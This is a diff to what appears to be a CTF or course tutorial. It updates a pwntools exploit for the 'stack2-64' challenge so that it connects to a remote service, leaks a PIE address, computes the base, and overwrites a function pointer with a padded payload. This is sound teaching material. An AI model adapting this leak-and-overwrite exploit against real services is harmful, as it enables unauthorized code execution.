@@ -1033,12 +1033,14 @@ The graduate challenge gives us everything needed to perform that calculation
 in a repeatable exploit:
 
 ```python
-from pwn import ELF, context, flat, p64, process
+from pwn import ELF, context, flat, p64, remote
 
 context.binary = elf = ELF('./stack2-64')
 diagnostics_offset = elf.symbols['diagnostics']
 
-p = process(elf.path)
+server = 'SERVER-FROM-PROBLEM-PAGE'
+port = 31337  # Replace this with the port from your problem page.
+p = remote(server, port)
 p.recvuntil(b'Diagnostic beacon: ')
 diagnostics_runtime = int(p.recvline().strip(), 16)
 
@@ -1048,6 +1050,7 @@ elf.address = pie_base
 
 recalibration_runtime = elf.symbols['recalibration']
 payload = flat({64: p64(recalibration_runtime)})
+p.recvuntil(b'Input rebased control packet: ')
 p.send(payload)
 print(p.recvall().decode(errors='replace'))
 ```
@@ -1058,9 +1061,10 @@ page-alignment assertion is a useful sanity check: executable mappings begin on
 page boundaries, so a correctly recovered base should end in three zero
 hexadecimal digits.
 
-Most importantly, do not let the process that produced the leak exit before you
-send the overwrite. A new execution receives a new PIE base under ASLR. The
-leak and the derived target are valid for the process that emitted that leak.
+Most importantly, do not close the connection that produced the leak before
+you send the overwrite. The Stack 2 service starts a new process for each new
+connection, and that new process receives a new PIE base under ASLR. The leak
+and the derived target are valid for the process behind the current connection.
 
 ### Question 1: What is the offset?
 
@@ -1152,34 +1156,41 @@ Once the exploit works, you may need to execute it against the actual challenge 
 
 You do **not** need to copy your exploit script into that directory.
 
-Suppose your exploit lives here:
+For a shell-local challenge, suppose your exploit lives here:
 
 ```text
-~/exploits/stack2.py
+~/exploits/stack1.py
 ```
 
 and the real challenge is here:
 
 ```text
-/problems/stack2g-64_INSTANCE_ID/
+/problems/stack1g-64_INSTANCE_ID/
 ```
 
 You can do:
 
 ```bash
-cd /problems/stack2g-64_INSTANCE_ID/
-python3 ~/exploits/stack2.py
+cd /problems/stack1g-64_INSTANCE_ID/
+python3 ~/exploits/stack1.py
 ```
 
 If the script opens:
 
 ```python
-ELF('./stack2-64')
+ELF('./stack1-64')
 ```
 
-then `./stack2-64` is resolved relative to the **current working directory**, not relative to the directory containing your Python script.
+then `./stack1-64` is resolved relative to the **current working directory**, not relative to the directory containing your Python script.
 
 This becomes even more important later because the execution environment can affect memory layout, especially addresses on the stack.
+
+`stack2g-64` is different: its live target is a remote service. Download and
+extract the provided archive so your exploit can load `./stack2-64` for symbol
+offsets, but connect to the host and port on the problem page with pwntools
+`remote`. Keep that connection open from the diagnostics leak through the
+function-pointer overwrite. You do not need to log into Shell 2 or enter its
+protected challenge directory.
 
 ## A Practical Exploit-Development Workflow
 
